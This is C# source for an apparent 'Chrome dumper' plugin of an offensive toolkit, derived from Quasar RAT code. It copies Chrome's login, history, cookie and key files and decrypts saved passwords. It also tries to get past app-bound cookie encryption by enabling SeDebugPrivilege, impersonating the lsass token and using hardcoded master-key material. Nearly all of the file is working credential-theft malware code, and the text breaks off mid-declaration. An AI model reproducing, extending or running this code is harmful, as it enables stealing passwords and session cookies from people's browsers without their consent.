using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Principal;
using Org.BouncyCastle.Crypto.Generators;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Cms;
using Newtonsoft.Json.Linq;
using System.Runtime.Remoting.Messaging;
using Plugin.Abstractions48;
using Org.BouncyCastle.Crypto;

namespace Plugin48Dumper
{
    public class clsChromeDumper : clsDumper
    {
        /// <summary>
        /// https://github.com/quasar/Quasar/blob/master/Quasar.Client/Recovery/Browsers/ChromiumDecryptor.cs
        /// </summary>

        private string ChromeDir { get { return Path.Combine(ApplicationData, "Google"); } }
        private string UserDataFile { get { return Path.Combine(LocalApplicationData, "Google", "Chrome", "User Data"); } }
        private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }
        private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }

        private string BookMarkFile { get { return Path.Combine(DefaultDir, "Bookmarks"); } }
        private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
        private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
        private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }

        public DataTable dtHelp = new DataTable();

        public clsChromeDumper()
        {
            Description = "Chrome dumper.";
            Usage = "foo";
            Entry = "chrome";

            dtHelp.Columns.Add("Action");
            dtHelp.Columns.Add("Description");

            dtHelp.Rows.Add("help", "Show help.");
            dtHelp.Rows.Add("cred", "Dump credentials.");
            dtHelp.Rows.Add("history", "Dump browser history records.");
            dtHelp.Rows.Add("download", "Dump downloaded files.");
            dtHelp.Rows.Add("bookmark", "Dump browser bookmarks.");

            Available = File.Exists(LoginFile);
        }

        public class clsCredential
        {
            public bool Decrypted;

            public string URL;
            public string Username;
            public string Password;
            public string szCreationDate;
            public string szLastUsed;
        }

        public class clsCookie
        {
            public string szHost { get; set; }
            public string szName { get; set; }
            public string szValue { get; set; }
        }

        public class clsHistory
        {
            public string Title;
            public string URL;
            public string szLastUsed;
        }

        public class clsDownload
        {
            public string FileName;
            public string TargetPath;
            public string URL;
            public long Length;
            public string szDate;
        }

        public class clsBookmark
        {
            public string Name;
            public string URL;
            public string Path;

            public string szAddDate;
            public string szLastUsed;
        }

        public override void fnRun(List<string> lsArgs)
        {
            if (lsArgs.Count == 0)
            {
                clsTools.fnPrintTable(dtHelp);
                return;
            }
        }

        public List<clsCredential> fnDumpCredential(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(LoginFile, dst);

            var handler = new clsSQLiteHandler(dst);
            if (!handler.ReadTable("logins"))
                return ls;

            int nRowCount = handler.GetRowCount();
            clsTools.fnLogInfo($"Total records: {nRowCount}");

            var decryptor = new ChromiumDecryptor(LocalStateFile);

            for (int i = 0; i < nCount; i++)
            {
                var origin_url = handler.GetValue(i, "origin_url");
                var username_value = handler.GetValue(i, "username_value");
                var password_value = "[FAILED]";
                var date_created = handler.GetValue(i, "date_created");
                var date_last_used = handler.GetValue(i, "date_last_used");

                try
                {
                    date_created = fnChromeTimeToDateTime(long.Parse(date_created))?.ToString("F");
                    date_last_used = fnChromeTimeToDateTime(long.Parse(date_last_used))?.ToString("F");
                }
                catch (Exception ex)
                {
                    clsTools.fnLogError(ex.Message);
                }

                bool bDecrypted = false;

                try
                {
                    password_value = decryptor.Decrypt(handler.GetValue(i, "password_value"));
                    bDecrypted = true;
                }
                catch (Exception ex)
                {
                    
                }

                if (!string.IsNullOrEmpty(origin_url) && (Regex.IsMatch(origin_url, szRegex) || Regex.IsMatch(username_value, szRegex)))
                {
                    ls.Add(new clsCredential
                    {
                        Decrypted = bDecrypted,

                        URL = origin_url,
                        Username = username_value,
                        Password = password_value,
                        szCreationDate = date_created,
                        szLastUsed = date_last_used,
                    });
                }
            }

            /*
            string szConnStr = fnConnString(dst);
            using (var conn = new SQLiteConnection(szConnStr))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = $"SELECT " +
                        $"CAST(origin_url AS TEXT) AS origin_url, " +
                        $"CAST(username_value AS TEXT) AS username_value, " +
                        $"password_value, " +
                        $"date_created, " +
                        $"date_last_used " +
                        $"FROM logins ORDER BY date_last_used DESC";

                    if (nCount > -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string szOriginalUrl = (string)reader["origin_url"];
                            string szUsername = (string)reader["username_value"];
                            byte[] abPassword = (byte[])reader["password_value"];
                            long nDateCreated = (long)reader["date_created"];
                            long nDateLastUsed = (long)reader["date_last_used"];

                            DateTime? dtCreated = fnChromeTimeToDateTime(nDateCreated);
                            DateTime? dtLastUsed = fnChromeTimeToDateTime(nDateLastUsed);

                            string szCreated = dtCreated == null ? "N/A" : dtCreated?.ToString("F");
                            string szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F");

                            string szPassword = string.Empty;
                            if (fnbIsV10(abPassword))
                            {
                                LocalState localState = new LocalState(LocalStateFile);

                                byte[] nonce, ciphertextTag;
                                fnPrepare(abPassword, out nonce, out ciphertextTag);
                                szPassword = fnszDecrypt(ciphertextTag, localState.Key, nonce);
                            }
                            else
                            {
                                try
                                {
                                    szPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(abPassword, null, DataProtectionScope.CurrentUser));
                                }
                                catch (Exception ex)
                                {
                                    szPassword = "ERROR://" + ex.Message;
                                }
                            }

                            if (Regex.IsMatch(szOriginalUrl, szRegex) ||
                                Regex.IsMatch(szUsername, szRegex) ||
                                Regex.IsMatch(szPassword, szRegex) ||
                                Regex.IsMatch(szConnStr, szRegex) ||
                                Regex.IsMatch(szLastUsed, szRegex)
                            )
                            {
                                ls.Add(new clsCredential()
                                {
                                    URL = szOriginalUrl,
                                    Username = szUsername,
                                    Password = szPassword,
                                    szCreationDate = dtCreated == null ? "N/A" : dtCreated?.ToString("F"),
                                    szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F"),
                                });
                            }
                        }
                    }
                }
            }
            */

            File.Delete(dst);

            return ls;
        }

        public List<clsHistory> fnDumpHistory(int nCount = 100, string szRegex = "")
        {
            List<clsHistory> ls = new List<clsHistory>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(HistoryFile, dst, true);

            var handler = new clsSQLiteHandler(dst);
            if (!handler.ReadTable("urls"))
                return ls;

            int nRowCount = handler.GetRowCount();
            clsTools.fnLogInfo($"Total records: {nRowCount}");

            for (int i = 0; i < nCount; i++)
            {
                var url = handler.GetValue(i, "url");
                var title = handler.GetValue(i, "title");
                var last_visit_time = handler.GetValue(i, "last_visit_time");

                if (!string.IsNullOrEmpty(url) && !string.IsNullOrEmpty(title) &&
                    (Regex.IsMatch(url, szRegex) || Regex.IsMatch(title, szRegex))
                )
                {
                    ls.Add(new clsHistory
                    {
                        URL = url,
                        Title = title,
                        szLastUsed = fnChromeTimeToDateTime(long.Parse(last_visit_time))?.ToString("F"),
                    });
                }
            }

            /*
            string szConnString = fnConnString(dst);
            using (var conn = new SQLiteConnection(szConnString))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = @"
                        SELECT 
                            CAST(url AS TEXT) AS url,
                            CAST(title AS TEXT) AS title,
                            last_visit_time
                        FROM urls
                        ORDER BY last_visit_time DESC";

                    if (nCount > -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string title = reader["title"]?.ToString();
                            string url = reader["url"]?.ToString();

                            long time = 0;
                            if (reader["last_visit_time"] != DBNull.Value)
                                long.TryParse(reader["last_visit_time"].ToString(), out time);

                            DateTime? dt = fnChromeTimeToDateTime(time);
                            string szLastUsed = dt == null ? "N/A" : dt?.ToString("F");

                            if (Regex.IsMatch(title, szRegex) ||
                                Regex.IsMatch(url, szRegex) ||
                                Regex.IsMatch(szLastUsed, szRegex)
                            )
                            {
                                ls.Add(new clsHistory()
                                {
                                    Title = title,
                                    URL = url,
                                    szLastUsed = szLastUsed,
                                });
                            }
                        }
                    }
                }
            }
            */

            File.Delete(dst);

            return ls;
        }

        public List<clsDownload> fnDumpDownload(int nCount = 100, string szRegex = "")
        {
            List<clsDownload> ls = new List<clsDownload>();

            string szDst = fnNewTempFilePath();
            File.Copy(HistoryFile, szDst);

            var handler = new clsSQLiteHandler(szDst);
            if (!handler.ReadTable("downloads"))
                return ls;

            int nRowCount = handler.GetRowCount();
            clsTools.fnLogInfo($"Total records: {nRowCount}");

            for (int i = 0; i < nCount; i++)
            {
                var target_path = handler.GetValue(i, "target_path");
                var total_bytes = handler.GetValue(i, "total_bytes");
                var tab_url = handler.GetValue(i, "tab_url");
                var end_time = handler.GetValue(i, "end_time");

                ls.Add(new clsDownload
                {
                    TargetPath = target_path,
                    Length = long.Parse(total_bytes),
                    URL = tab_url,
                    szDate = fnChromeTimeToDateTime(long.Parse(end_time))?.ToString("F"),
                });
            }

            /*
            string szConnStr = fnConnString(szDst);
            using (var conn = new SQLiteConnection(szConnStr))
            {
                conn.Open();

                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = $"SELECT " +
                        $"CAST(target_path AS TEXT) AS target_path, " +
                        $"total_bytes, " +
                        $"CAST(tab_url AS TEXT) AS tab_url, " +
                        $"end_time " +
                        $"FROM downloads ORDER BY end_time DESC";
                    if (nCount != -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string szTargetPath = reader["target_path"]?.ToString();
                            long nTotalBytes = long.Parse(reader["total_bytes"]?.ToString());
                            string szURL = reader["tab_url"]?.ToString();
                            long nEndTime = long.Parse(reader["end_time"]?.ToString());
                            
                            DateTime? dt = fnChromeTimeToDateTime(nEndTime);
                            string szData = dt == null ? "N/A" : dt?.ToString("F");

                            if (Regex.IsMatch(szTargetPath, szRegex) || 
                                Regex.IsMatch(nTotalBytes.ToString(), szRegex) ||
                                Regex.IsMatch(szURL, szRegex) ||
                                Regex.IsMatch(szData, szRegex)
                            )
                            {
                                ls.Add(new clsDownload()
                                {
                                    TargetPath = szTargetPath,
                                    Length = nTotalBytes,
                                    URL = szURL,
                                    szDate = szData,
                                });
                            }
                        }
                    }
                }
            }
            */

            File.Delete(szDst);

            return ls;
        }

        public List<clsBookmark> fnDumpBookmark(int nCount = 100)
        {
            List<clsBookmark> ls = new List<clsBookmark>();

            string szContent = File.ReadAllText(BookMarkFile);
            
            var root = JObject.Parse(szContent);
            var roots = root["roots"];
            if (roots == null)
                return ls;

            foreach (var r in roots.Children<JProperty>())
            {
                var node = r.Value;
                fnParseNode(node, r.Name, ls, nCount);
            }

            return ls;
        }

        public List<clsCookie> fnDumpCookie(int nCount = 100, string szRegex = "")
        {
            List<clsCookie> ls = new List<clsCookie>();
            string szLocalStateFilePath = LocalStateFile;
            string szCookieFilePath = Path.Combine(DefaultDir, "Network", "Cookies");

            if (!File.Exists(szLocalStateFilePath))
                throw new Exception("File not found: " + szLocalStateFilePath);

            if (!File.Exists(szCookieFilePath))
                throw new Exception("File not found: " + szCookieFilePath);

            string szTempLocalStatePath = fnNewTempFilePath();
            string szTempCookiePath = fnNewTempFilePath();

            File.Copy(szLocalStateFilePath, szTempLocalStatePath);
            File.Copy(szCookieFilePath, szTempCookiePath);

            if (!File.Exists(szTempLocalStatePath))
                throw new Exception("Copy file failed: " + szLocalStateFilePath);

            if (!File.Exists(szTempCookiePath))
                throw new Exception("Copy file failed: " + szCookieFilePath);

            dynamic objJson = JsonConvert.DeserializeObject(File.ReadAllText(szTempLocalStatePath));
            string szKey = objJson.os_crypt.app_bound_encrypted_key;
            byte[] abBoundKey = Convert.FromBase64String(szKey);
            byte[] abApp = new byte[4];
            Buffer.BlockCopy(abBoundKey, 0, abApp, 0, 4);
            if (!string.Equals("APPB", Encoding.ASCII.GetString(abApp)))
                throw new Exception("Invalid data: " + szKey);

            byte[] abKey = abBoundKey.Skip(4).ToArray();

            byte[] abKeyMachine = { };
            using (new ImpersonateLsass())
            {
                abKeyMachine = ProtectedData.Unprotect(abKey, null, DataProtectionScope.LocalMachine);
            }

            byte[] abKeyUser = ProtectedData.Unprotect(abKeyMachine, null, DataProtectionScope.CurrentUser);

            var dicParsedData = fnParseKeyBlob(abKeyUser);
            byte[] abV20MasterKey = fnDeriveV20MasterKey(dicParsedData);



            /*
            string szConnStr = fnConnString(szTempCookiePath);
            using (var conn = new SQLiteConnection(szConnStr))
            {
                conn.Open();
                
                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = $"" +
                        $"SELECT host_key, " +
                        $"name, " +
                        $"CAST(encrypted_value AS BLOB) " +
                        $"FROM cookies";

                    cmd.CommandText = szQuery;

                    using(var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            byte[] abCipherCookie = (byte[])reader["encrypted_value"];

                            byte[] abIV = (byte[])dicParsedData["iv"];
                            byte[] abTag = (byte[])dicParsedData["tag"];
                            clsTools.fnLogOK(fnDecryptV20(abV20MasterKey, abIV, abCipherCookie, abTag));
                        }
                    }
                }
            }
            */

            File.Delete(szTempLocalStatePath);
            File.Delete(szTempCookiePath);

            return ls;
        }

        private string fnDecryptV20(
            byte[] masterKey,
            byte[] iv,
            byte[] ciphertext,
            byte[] tag)
        {
            byte[] plain = AesGcmDecrypt(masterKey, iv, ciphertext, tag);
            return Encoding.UTF8.GetString(plain);
        }

        public byte[] fnDeriveV20MasterKey(Dictionary<string, object> parsedData)
        {
            byte flag = (byte)parsedData["flag"];
            byte[] iv = (byte[])parsedData["iv"];
            byte[] ciphertext = (byte[])parsedData["ciphertext"];
            byte[] tag = (byte[])parsedData["tag"];

            if (flag == 1)
            {
                byte[] aesKey = HexToBytes(
                    "B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787");

                return AesGcmDecrypt(aesKey, iv, ciphertext, tag);
            }
            else if (flag == 2)
            {
                byte[] chachaKey = HexToBytes(
                    "E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660");

                return ChaCha20Poly1305Decrypt(chachaKey, iv, ciphertext, tag);
            }
            else if (flag == 3)
            {
                byte[] xorKey = HexToBytes(
                    "CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390");

                byte[] encryptedAesKey = (byte[])parsedData["encrypted_aes_key"];

                byte[] decryptedAesKey;
                using (new ImpersonateLsass())
                {
                    decryptedAesKey = CngDecryptor.DecryptWithCng(encryptedAesKey);
                }

                if (decryptedAesKey.Length < 32)
                    throw new CryptographicException("Invalid decrypted AES key length");

                byte[] aesKey = decryptedAesKey.Take(32).ToArray();
                byte[] finalKey = ByteXor(aesKey, xorKey);

                return AesGcmDecrypt(finalKey, iv, ciphertext, tag);
            }
            else
            {
                throw new NotSupportedException($"Unsupported flag: {flag}");
            }
        }

        private byte[] AesGcmDecrypt(
            byte[] key,
            byte[] iv,
            byte[] ciphertext,
            byte[] tag)
        {
            var cipher = new GcmBlockCipher(new AesEngine());
            var parameters = new AeadParameters(
                new KeyParameter(key),
                128,   // tag bits
                iv
            );

            cipher.Init(false, parameters);

            byte[] combined = new byte[ciphertext.Length + tag.Length];
            Buffer.BlockCopy(ciphertext, 0, combined, 0, ciphertext.Length);
            Buffer.BlockCopy(tag, 0, combined, ciphertext.Length, tag.Length);

            byte[] output = new byte[cipher.GetOutputSize(combined.Length)];
            int len = cipher.ProcessBytes(combined, 0, combined.Length, output, 0);
            cipher.DoFinal(output, len);

            return output;
        }

        private byte[] ChaCha20Poly1305Decrypt(
            byte[] key,
            byte[] iv,
            byte[] ciphertext,
            byte[] tag)
        {
            var cipher = new ChaCha20Poly1305();
            var parameters = new AeadParameters(
                new KeyParameter(key),
                128,
                iv
            );

            cipher.Init(false, parameters);

            byte[] combined = new byte[ciphertext.Length + tag.Length];
            Buffer.BlockCopy(ciphertext, 0, combined, 0, ciphertext.Length);
            Buffer.BlockCopy(tag, 0, combined, ciphertext.Length, tag.Length);

            byte[] output = new byte[cipher.GetOutputSize(combined.Length)];
            int len = cipher.ProcessBytes(combined, 0, combined.Length, output, 0);
            cipher.DoFinal(output, len);

            return output;
        }

        private static byte[] ByteXor(byte[] a, byte[] b)
        {
            byte[] result = new byte[a.Length];
            for (int i = 0; i < a.Length; i++)
                result[i] = (byte)(a[i] ^ b[i]);
            return result;
        }

        private static byte[] HexToBytes(string hex)
        {
            int len = hex.Length / 2;
            byte[] data = new byte[len];
            for (int i = 0; i < len; i++)
                data[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
            return data;
        }

        public Dictionary<string, object> fnParseKeyBlob(byte[] blobData)
        {
            var parsedData = new Dictionary<string, object>();

            using (var ms = new MemoryStream(blobData))
            using (var br = new BinaryReader(ms))
            {
                //header_len (uint32, little-endian)
                uint headerLen = br.ReadUInt32();
                parsedData["header"] = br.ReadBytes((int)headerLen);

                // content_len (uint32, little-endian)
                uint contentLen = br.ReadUInt32();

                // assert header_len + content_len + 8 == len(blob_data)
                if (headerLen + contentLen + 8 != blobData.Length)
                    throw new InvalidDataException("Invalid blob length");

                // flag (1 byte)
                byte flag = br.ReadByte();
                parsedData["flag"] = flag;

                if (flag == 1 || flag == 2)
                {
                    // [flag|iv|ciphertext|tag]
                    // [1|12|32|16]
                    parsedData["iv"] = br.ReadBytes(12);
                    parsedData["ciphertext"] = br.ReadBytes(32);
                    parsedData["tag"] = br.ReadBytes(16);
                }
                else if (flag == 3)
                {
                    // [flag|encrypted_aes_key|iv|ciphertext|tag]
                    // [1|32|12|32|16]
                    parsedData["encrypted_aes_key"] = br.ReadBytes(32);
                    parsedData["iv"] = br.ReadBytes(12);
                    parsedData["ciphertext"] = br.ReadBytes(32);
                    parsedData["tag"] = br.ReadBytes(16);
                }
                else
                {
                    throw new NotSupportedException($"Unsupported flag: {flag}");
                }
            }

            return parsedData;
        }

        private bool fnbIsV10(byte[] abData) => string.Equals("v10", Encoding.UTF8.GetString(abData.Take(3).ToArray()));
        private bool fnbIsV20(byte[] abData) => string.Equals("v20", Encoding.UTF8.GetString(abData.Take(3).ToArray()));

        private void fnPrepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        private string fnszDecrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            string sR = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch
            {
                return "Decryption failed :(";
            }

            return sR;
        }

        private void fnParseNode(JToken node, string szCurrentPath, List<clsBookmark> output, int nMaximum)
        {
            var type = node["type"]?.ToString();

            if (nMaximum != -1 && output.Count >= nMaximum)
                return;

            if (type == "url")
            {
                output.Add(new clsBookmark()
                {
                    Name = node["name"]?.ToString(),
                    URL = node["url"]?.ToString(),
                    Path = szCurrentPath,

                    szAddDate = fnChromeTimeToDateTime(long.Parse(node["date_added"]?.ToString()))?.ToString("F"),
                    szLastUsed = fnChromeTimeToDateTime(long.Parse(node["date_last_used"]?.ToString()))?.ToString("F"),
                });

                return;
            }

            var children = node["children"];
            if (children == null)
                return;

            foreach (var child in children)
            {

                var name = child["name"]?.ToString();
                var nextPath = string.IsNullOrEmpty(name) ? szCurrentPath : $"{szCurrentPath}/{name}";

                fnParseNode(child, nextPath, output, nMaximum);
            }
        }

        public class BCrypt
        {
            public const uint ERROR_SUCCESS = 0x00000000;
            public const uint BCRYPT_PAD_PSS = 8;
            public const uint BCRYPT_PAD_OAEP = 4;

            public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

            public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
            public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
            public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
            public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
            public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
            public static readonly string BCRYPT_AES_ALGORITHM = "AES";

            public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

            public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
            public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

            public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_PSS_PADDING_INFO
            {
                public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
                {
                    this.pszAlgId = pszAlgId;
                    this.cbSalt = cbSalt;
                }

                [MarshalAs(UnmanagedType.LPWStr)]
                public string pszAlgId;
                public int cbSalt;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
            {
                public int cbSize;
                public int dwInfoVersion;
                public IntPtr pbNonce;
                public int cbNonce;
                public IntPtr pbAuthData;
                public int cbAuthData;
                public IntPtr pbTag;
                public int cbTag;
                public IntPtr pbMacContext;
                public int cbMacContext;
                public int cbAAD;
                public long cbData;
                public int dwFlags;

                public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
                {
                    dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                    cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                    if (iv != null)
                    {
                        cbNonce = iv.Length;
                        pbNonce = Marshal.AllocHGlobal(cbNonce);
                        Marshal.Copy(iv, 0, pbNonce, cbNonce);
                    }

                    if (aad != null)
                    {
                        cbAuthData = aad.Length;
                        pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                        Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
                    }

                    if (tag != null)
                    {
                        cbTag = tag.Length;
                        pbTag = Marshal.AllocHGlobal(cbTag);
                        Marshal.Copy(tag, 0, pbTag, cbTag);

                        cbMacContext = tag.Length;
                        pbMacContext = Marshal.AllocHGlobal(cbMacContext);
                    }
                }

                public void Dispose()
                {
                    if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                    if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
                    if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
                    if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_KEY_LENGTHS_STRUCT
            {
                public int dwMinLength;
                public int dwMaxLength;
                public int dwIncrement;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_OAEP_PADDING_INFO
            {
                public BCRYPT_OAEP_PADDING_INFO(string alg)
                {
                    pszAlgId = alg;
                    pbLabel = IntPtr.Zero;
                    cbLabel = 0;
                }

                [MarshalAs(UnmanagedType.LPWStr)]
                public string pszAlgId;
                public IntPtr pbLabel;
                public int cbLabel;
            }

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                                  [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
                                                                  [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
                                                                  uint dwFlags);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

            [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
            public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

            [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
            internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


            [DllImport("bcrypt.dll")]
            public static extern uint BCryptImportKey(IntPtr hAlgorithm,
                                                             IntPtr hImportKey,
                                                             [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
                                                             out IntPtr phKey,
                                                             IntPtr pbKeyObject,
                                                             int cbKeyObject,
                                                             byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
                                                             int cbInput,
                                                             uint dwFlags);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptDestroyKey(IntPtr hKey);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptEncrypt(IntPtr hKey,
                                                    byte[] pbInput,
                                                    int cbInput,
                                                    ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                    byte[] pbIV, int cbIV,
                                                    byte[] pbOutput,
                                                    int cbOutput,
                                                    ref int pcbResult,
                                                    uint dwFlags);

            [DllImport("bcrypt.dll")]
            internal static extern uint BCryptDecrypt(IntPtr hKey,
                                                      byte[] pbInput,
                                                      int cbInput,
                                                      ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                      byte[] pbIV,
                                                      int cbIV,
                                                      byte[] pbOutput,
                                                      int cbOutput,
                                                      ref int pcbResult,
                                                      int dwFlags);
        }
        public class LocalState
        {
            private readonly string Path;
            private string EncryptedKey;
            public byte[] Key { get; private set; }

            public LocalState(string path) { this.Path = path; DecryptKey(); }


            private void DecryptKey()
            {
                FindPlainKey();

                byte[] decodedKey = Convert.FromBase64String(EncryptedKey);
                byte[] encryptedKey = decodedKey.Skip(5).ToArray();
                this.Key = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            }


            private void FindPlainKey()
            {
                using (StreamReader file = File.OpenText(Path))
                {
                    string localState = file.ReadToEnd();
                    dynamic dyJson = JsonConvert.DeserializeObject(localState);
                    string szKey = dyJson.os_crypt.encrypted_key;

                    EncryptedKey = szKey;
                }
            }
        }
        public sealed class ImpersonateLsass : IDisposable
        {
            private WindowsImpersonationContext _context;
            private IntPtr _duplicatedToken = IntPtr.Zero;

            public ImpersonateLsass()
            {
                EnableSeDebugPrivilege();

                Process lsass = Process.GetProcessesByName("lsass").First();

                IntPtr processHandle = OpenProcess(
                    ProcessAccessFlags.QueryInformation,
                    false,
                    lsass.Id);

                if (!OpenProcessToken(
                    processHandle,
                    TokenAccessLevels.Duplicate | TokenAccessLevels.Query,
                    out IntPtr lsassToken))
                    throw new Exception("OpenProcessToken failed");

                if (!DuplicateTokenEx(
                    lsassToken,
                    TokenAccessLevels.Impersonate | TokenAccessLevels.Query,
                    IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
                    TOKEN_TYPE.TokenImpersonation,
                    out _duplicatedToken))
                    throw new Exception("DuplicateTokenEx failed");

                var identity = new WindowsIdentity(_duplicatedToken);
                _context = identity.Impersonate();
            }

            public void Dispose()
            {
                _context?.Undo();
                if (_duplicatedToken != IntPtr.Zero)
                    CloseHandle(_duplicatedToken);
            }

            // ---------------- native ----------------

            private static void EnableSeDebugPrivilege()
            {
                using (var identity = WindowsIdentity.GetCurrent(TokenAccessLevels.AdjustPrivileges))
                {
                    var token = identity.Token;
                    LUID luid;
                    LookupPrivilegeValue(null, "SeDebugPrivilege", out luid);

                    TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
                    {
                        PrivilegeCount = 1,
                        Privileges = new LUID_AND_ATTRIBUTES[]
                        {
                    new LUID_AND_ATTRIBUTES
                    {
                        Luid = luid,
                        Attributes = 0x2 // SE_PRIVILEGE_ENABLED
                    }
                        }
                    };

                    AdjustTokenPrivileges(token, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
                }
            }

            // ---------------- P/Invoke ----------------

            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool OpenProcessToken(
                IntPtr ProcessHandle,
                TokenAccessLevels DesiredAccess,
                out IntPtr TokenHandle);

            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool DuplicateTokenEx(
                IntPtr hExistingToken,
                TokenAccessLevels dwDesiredAccess,
                IntPtr lpTokenAttributes,
                SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
                TOKEN_TYPE TokenType,
                out IntPtr phNewToken);

            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool LookupPrivilegeValue(
                string lpSystemName,
                string lpName,
                out LUID lpLuid);

            [DllImport("advapi32.dll", SetLastError = true)]
            static extern bool AdjustTokenPrivileges(
